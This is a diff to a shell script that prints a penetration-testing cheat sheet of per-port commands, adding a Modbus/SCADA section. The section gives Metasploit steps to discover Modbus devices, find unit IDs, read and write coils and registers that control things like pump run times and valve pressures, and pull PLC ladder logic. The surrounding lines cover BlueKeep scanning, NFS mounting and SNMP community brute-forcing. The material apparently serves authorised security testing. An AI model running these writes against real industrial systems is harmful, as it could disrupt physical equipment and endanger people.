@@ -153,10 +153,65 @@ echo '
 		-in wireshark, filter smb2.sec_mode.sign_required == 0 or tcp.port==445
 		-look for "Security Mode" in one of the Negotiate Protocol Responses & verify that "Signing Required" states False.
 
-
 [ smb - Bluekeep / EternalBlue ]
 	-msfconsole 
 		scanner/rdp/cve_2019_0708_bluekeep
+
+
+[ 502 - Modbus ]
+	// nmap //
+  		nmap --script modbus-discover -p 502 -oN '"${ip}"'-p502-nmap-modbus-discover.txt '"${ip}"'
+	
+	// msfconsole //
+ 	https://www.hackers-arise.com/post/2018/10/22/metasploit-basics-part-16-metasploit-scada-hacking
+		-Search for Modbus modules:
+			msf > search modbus
+		
+  		-To check if target is running Modbus:
+			msf > use auxiliary/scanner/scada/modbusdetect
+   
+		-To grab banner:
+  			msf > use auxiliary/scanner/scada/modbus_banner_grabbing
+  		-Next, find the Unit ID of the connected devices; its like a ping sweep:
+			To communicate with any Modbus device, we need to have its Unit ID
+			msf > use auxiliary/scanner/scada/modbus_findunitid
+		
+  		-Next, to read Modbus devices:
+			msf > use auxiliary/scanner/scada/modbusclient
+			Set ACTION to one of the below:
+	   			1. READ_REGISTERS
+		  		2. WRITE_REGISTERS
+		 		3. READ_COILS
+				4. WRITE_COILS
+			Set UNIT_NUMBER (default: 1) for the starting unit.
+   			Set NUMBER (default: 1) for the no. of units to take ACTION on (eg. set 100 to READ_REGISTERS 100 registers)
+	  		msf > exploit
+	 
+	 	-Next, to write Modbus devices:
+   			msf > set ACTION WRITE_COIL
+	  		msf > set DATA 1
+	 			(only 1 or 0 are valid values)
+	 			(In SCADA/ICS, coils are devices that are either ON or OFF which are 1 or 0)
+			msf > set ACTION READ_COILS
+			Then can check if its successfully modified with set ACTION READ_COILS.
+   		
+	 	-To write values in the registers:
+   			[!] These are memory areas that hold values used within the device to set such things as how long to run a pump or at what pressure should a valve open. Changing these values could have dire repercussions! [!]
+	  
+   			msf > set ACTION WRITE_REGISTERS
+			msf > set DATA 27,27,27,27,27
+			msf > exploit
+   			Check with set ACTION READ_REGISTERS
+	  
+		-Also, check if can download the PLC Ladder Logic:
+			msf > use auxiliary/admin/scada/modicon_stux_transfer
+			msf > set MODE RECV
+   			msf > set RHOST '"${ip}"'
+	  		msf > exploit
+
+		
+
+
 
 
 [ 623 - IPMI ]
@@ -242,7 +297,7 @@ echo '
 		mount -t nfs '"${ip}"':/<directory> <local directory> -o nolock
 
 
-[ UDP/161 - SNMP ] 
+[ UDP/161 - SNMP ]
 	-SNMP Agent Default Community Name (public):
 		onesixtyone '"${ip}"' -c /usr/share/doc/onesixtyone/dict.txt
 		
@@ -250,6 +305,7 @@ echo '
 
 	//nmap//
 		nmap -sU -p 161 -sV -sC '"${ip}"' -oN '"${ip}"'_p161_nmap.txt
+
 
 
 '
